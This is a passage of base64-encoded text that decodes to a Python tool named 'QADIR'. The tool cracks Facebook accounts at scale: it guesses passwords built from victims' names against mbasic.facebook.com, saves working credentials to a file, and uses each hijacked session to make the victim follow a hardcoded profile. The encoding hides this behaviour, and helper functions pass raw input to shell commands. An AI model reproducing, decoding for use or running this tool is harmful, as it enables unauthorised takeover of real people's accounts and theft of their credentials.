193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJyBXUk9ORyAnKTsNCiAgICAgICAgICAgIHNlbGYuUUFESVJ4KGlkKQ0KICAgIGRlZiBfX21ldG9kZV9fKHNlbGYsIHVzZXIsIF9fY2hpX18sIGNlYm9rKToNCiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmIlxyIFx4MWJbMTs5Mm1bUUFESVJdIHtsb29wfS97bGVuKHNlbGYuaWQpfSBPSy17bGVuKG9rKX1dIENQLXtsZW4oY3ApfV0gIikNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOg0KICAgICAgICAgICAgICAgIHB3ID0gcHcubG93ZXIoKQ0KICAgICAgICAgICAgICAgIHNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICAgICAgaGVhZGVyID0gew0KICAgICAgICAgICAgICAgICAgICAiSG9zdCI6Y2Vib2ssDQogICAgICAgICAgICAgICAgICAgICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsDQogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicHBhc3NnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQogICAgICAgICAgICAgICAgICAgICJkbnQiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLA0KICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpDQogICAgICAgICAgICAgICAgZGFzID0gew0KICAgICAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgInVpZCI6dXNlciwNCiAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJsb2dpbl9ub19waW4iLA0KICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsDQogICAgICAgICAgICAgICAgICAgICJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7DQogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAib3JpZ2luIjoiaHR0cHM6Ly8iK2NlYm9rLA0KICAgICAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwNCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJYTUxIdHRwUmVxdWVzdCIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLA0KICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vIitjZWJvaysiL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSBiciIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcG8gPSBzZXNzaW9uLnBvc3QoZiJodHRwczovL3tjZWJva30vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAiLCBkYXRhID0gZGFzLCBoZWFkZXJzID0gaGVhZGVyMSwgYWxsb3dfcmVkaXJlY3RzID0gRmFsc2UpDQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJccntIfSBbUUFESVItT0tdIHt1c2VyfSB8IHtwd30iKQ0KICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgIG9rLmFwcGVuZCh3cnQpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ1FBRElSX09rLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBsb29wKz0xDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHNlbGYuX21ldG9kZV8odXNlciwgcHcsIGNlYm9rKQ0KDQogICAgZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMTc1NjU5NDQ1NjcnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsIHN0cmluZz0nSWt1dGknKS5nZXQoJ2hyZWYnKQ0KICAgICAgICBzZXNzaW9uLmdldCgoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSksIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICBwcmludChiYW5uZXIpDQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMzbSBUb3RhbCBJZHogOiBcMDMzWzE7MzJtJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzNtIEJydXRlIEhhcyBiZWVuIHN0YXJ0ZWQnKQ0KICAgICAgICAgICAgcHJpbnQoNTQqIl8iKQ0KICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICBwcmludCgiICAgICAgW1wwMzNbMTs5N21cMDMzWzE7NDFtICBVc2UgQWlycGxhbmUgbW9kZSBGb3IgU3BlZWR1cCBDbG9uaW5nICBcMDMzWzBtXDAzM1sxOzkzbV0iKQ0KICAgICAgICAgICAgcHJpbnQoNTQqIl8iKQ0KICAgICAgICAgICAgcHJpbnQoIiIpDQogICAgICAgICAgICB3aXRoIFFBRElSYWJiYShtYXhfd29ya2Vycz0zMCkgYXMgUUFESVI6DQogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHpzYi5zcGxpdCgnfCcpDQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3QsIGxhc3QgPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0bCA9IGZpcnN0Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RsID0gbGFzdC5sb3dlcigpDQogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdHMgPSBmaXJzdC50aXRsZSgpDQogICAgICAgICAgICAgICAgICAgICAgICBsYXN0cyA9IGxhc3QudGl0bGUoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtmaXJzdGwrJyAnK2xhc3RsLGZpcnN0bCtsYXN0bCwgZmlyc3QrJyAnK2xhc3RzLCBmaXJzdCsiMTIzIiwgZmlyc3QrIjEyMzQ1Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW2ZpcnN0bCsnICcrbGFzdGwsZmlyc3RsK2xhc3RsLCBmaXJzdCsnICcrbGFzdHMsIGZpcnN0KyIxMjMiLCBmaXJzdCsiMTIzNDUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBRQURJUi5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICBoYXNpbChvayxjcCkNCiAgICAgDQppZiBub3Qgb3MucGF0aC5leGlzdHMoIi5xZHJ3b3JrLnR4dCIpOg0KCW9wZW4oIi5xZHJ3b3JrLnR4dCIsICd3JykuY2xvc2UoKQ0KDQpjbGFzcyBsb2FkOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgXyA9ICcnDQogICAgICAgIF9fID0gaW50KCczMCcpDQogICAgICAgIF9fXyA9IGludCgnMCcpDQogICAgICAgIF9fIC09IDENCiAgICAgICAgX19fICs9IDENCiAgICAgICAgZm9yIHQgaW4gcmFuZ2UoaW50KCIxIikpOg0KICAgICAgICAgICAgcHJpbnQoJ1xyIExvYWRpbmcgLi4uJykNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCgwLjEpDQogICAgICAgIHByaW50KCdcbicpDQoNCmJheW5ha191YV94YW9taSAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KYmF5bmFrX3VhX25va2lhICAgPSAnbm9raWFjMy0wMC81LjAgKDA3LjIwKSBwcm9maWxlL21pZHAtMi4xIGNvbmZpZ3VyYXRpb24vY2xkYy0xLjEgbW96aWxsYS81LjAgYXBwbGV3ZWJraXQvNDIwKyAoa2h0bWwsIGxpa2UgZ2Vja28pIHNhZmFyaS80MjArJw0KYmF5bmFrX3VhX2FzdXMgICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQpiYXluYWtfdWFfaHVhd2VpICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IEhVQVdFSSBZNyBQUklNRSAyMDE5IEJ1aWxkLzU4ODcyMDgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjIgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KYmF5bmFrX3VhX3Zpdm8gICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyB2aXZvIDE5MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjIgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJw0KYmF5bmFrX3VhX29wcG8gICAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMS4xOyBBMzdmKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODkuMC40Mzg5LjEwNSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQpiYXluYWtfdWFfc2Ftc3VuZyA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBTTS1HOTAwUCBCdWlsZC9MUlgyMVQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNDMuMC4yMzU3LjEyMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNS4wLjAuNDguMjczO10nDQpiYXluYWtfdWFfd2luZG93cyA9ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCmJhbm5lciA9ICIiIg0KDQpcMDMzWzE7MzJtICAgICMjIyMjIyMgICAgICMjIyAgICAjIyMjIyMjIyAgIyMjIyAjIyMjIyMjIyAgDQpcMDMzWzE7MzNtICAgIyMgICAgICMjICAgIyMgIyMgICAjIyAgICAgIyMgICMjICAjIyAgICAgIyMgDQpcMDMzWzE7MzdtICAgIyMgICAgICMjICAjIyAgICMjICAjIyAgICAgIyMgICMjICAjIyAgICAgIyMgDQpcMDMzWzE7MzJtICAgIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgICMjICAjIyMjIyMjIyAgDQpcMDMzWzE7MzNtICAgIyMgICMjICMjICMjIyMjIyMjIyAjIyAgICAgIyMgICMjICAjIyAgICMjICAgDQpcMDMzWzE7MzdtICAgIyMgICAgIyMgICMjICAgICAjIyAjIyAgICAgIyMgICMjICAjIyAgICAjIyAgDQpcMDMzWzE7MzJtICAgICMjIyMjICMjICMjICAgICAjIyAjIyMjIyMjIyAgIyMjIyAjIyAgICAgIyMgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KXDAzM1sxOzkzbV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KDQpcMDMzWzE7MzJtIFsrXSBBdXRob3IgIDogUUFESVINClwwMzNbMTszMm0gWytdIEZiIElEICAgOiBNdWhhbW1hZCBRQURJUg0KXDAzM1sxOzMybSBbK10gVmVyc2lvbiA6IDMuMA0KXDAzM1sxOzMybSBbK10gR2l0aHViICA6IGh0dHBzOi8vZ2l0aHViLmNvbS9RQURJUmtpbmcNClwwMzNbMTs5M21fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18NCiIiIg0KY3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQptb250aHN4ID0gWyJKYW51YXJ5IiwgIkZlYnJ1YXJ5IiwgIk1hcmNoIiwgIkFwcmlsIiwgIk1heSIsICJKdW5lIiwgIkp1bHkiLCAiQXVndXN0IiwgIlNlcHRlbWJlciIsICJPY3RvYmVyIiwgIk5vdmVtYmVyIiwgIkRlY2VtYmVyIl0NCnRyeToNCglpZiBuIDwgMCBvciBuID4gMTI6DQoJCWV4aXQoKQ0KCW5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KCWV4aXQoKQ0KdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIg0KX3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkNCg0KZGVmIHNlcCgpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKTtwcmludChiYW5uZXIpDQogICAgdHJ5Og0KICAgICAgICBsaW1pdCA9IGludChpbnB1dCgnIEhvdyBtYW55IGxpbmtzIGRvIHlvdSB3YW50IHRvIHNlcGFyYXRlPyAnKSkNCiAgICBleGNlcHQ6DQogICAgICAgIGxpbWl0ID0gMQ0KICAgIHByaW50ICgnXDAzM1sxOzMybSBFeGFtcGxlIC9zZGNhcmQveHh4LnR4dCcpDQogICAgZmlsZV9uYW1lID0gaW5wdXQoJ1wwMzNbMTszM20gSW5wdXQgZmlsZSBuYW1lOiAnKQ0KICAgIHByaW50ICgnXDAzM1sxOzMybSBFeGFtcGxlIC9zZGNhcmQveG5ldy50eHQnKQ0KICAgIG5ld19zYXZlID0gaW5wdXQoJ1wwMzNbMTszM20gU2F2ZSBuZXcgZmlsZSBhczogJykNCiAgICB5ID0gMA0KICAgIGZvciBrIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgeSs9MQ0KICAgICAgICBwcmludCAoJ1wwMzNbMTszMm0gRVhBTVBMRSBbMTAwMDc5XSxbMTAwMDBdIGV0Y1wwMzNbMG0nKQ0KICAgICAgICBsaW5rcyA9IGlucHV0KCcgXDAzM1sxOzMzbVB1dCBsaW5rcyAlczpcMDMzWzE7MzJtICclKHkpKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NhdCAnK2ZpbGVfbmFtZSsnIHwgZ3JlcCAiJytsaW5rcysnIiA+PiAnK25ld19zYXZlKQ0KICAgIHByaW50KDU0KiJcMDMzWzE7MzNtXyIpDQogICAgcHJpbnQoIiIpDQogICAgcHJpbnQoJ1wwMzNbMTszM20gTGlua3MgZ3JhYmJlZCBzdWNjZXNzZnVsbHknKQ0KICAgIHByaW50KCcgVG90YWwgZ3JhYmJlZCBsaW5rczpcMDMzWzE7MzJtICAgJytzdHIobGVuKG9wZW4obmV3X3NhdmUpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkNCiAgICBwcmludCgnXDAzM1sxOzMzbSBOZXcgZmlsZSBzYXZlZCBhczogXDAzM1sxOzMybSAgJytuZXdfc2F2ZSkNCiAgICBwcmludCg1NCoiXDAzM1sxOzMzbV8iKQ0KICAgIHByaW50KCIiKQ0KICAgIGlucHV0KCdcMDMzWzE7MzJtIFByZXNzIGVudGVyIHRvIGJhY2sgJykNCiAgICB2ZXJzaW9uKCkNCg0KZGVmIGR1cGN1dHRlcigpOg0KCW9zLnN5c3RlbSgnY2xlYXInKTtwcmludChiYW5uZXIpDQoJcHJpbnQoIlsrXSBFeGFtcGxlIDogL3NkY2FyZC95b3VyX2ZpbGVfbmFtZS50eHQgIFxuXG4iKQ0KCU1haGFyID0gaW5wdXQoJ1srXSBGaWxlIFBhdGggICA6ICcpDQoJUWFkaXIgPSBpbnB1dCgnWytdIE5ldyBGaWxlIFNhdmUgQXMgOiAnKQ0KCW9zLnN5c3RlbSgndG91Y2ggJyArUWFkaXIpDQoJb3Muc3lzdGVtKCdzb3J0IC1yICcrTWFoYXIrJyB8IHVuaXEgPiAnK1FhZGlyKQ0KCXByaW50KCIiKQ0KCXByaW50KCIiKQ0KCXByaW50KDU0KiJcMDMzWzE7MzNtXyIpDQoJcHJpbnQoIiIpDQoJcHJpbnQoIlsrXSBSZW1vdmluZyBTdWNjZXNzZnVsICBGcm9tIEZpbGUgIiArIE1haGFyICkNCglwcmludCgiWytdIE5ldyBGaWxlIFNhdmUgIiArIFFhZGlyICkNCglwcmludCg1NCoiXDAzM1sxOzMzbV8iKQ0KCXRpbWUuc2xlZXAoMikNCg0KaWYgX19uYW1lX189PSdfX21haW5fXyc6DQoJdmVyc2lvbigpDQo="))
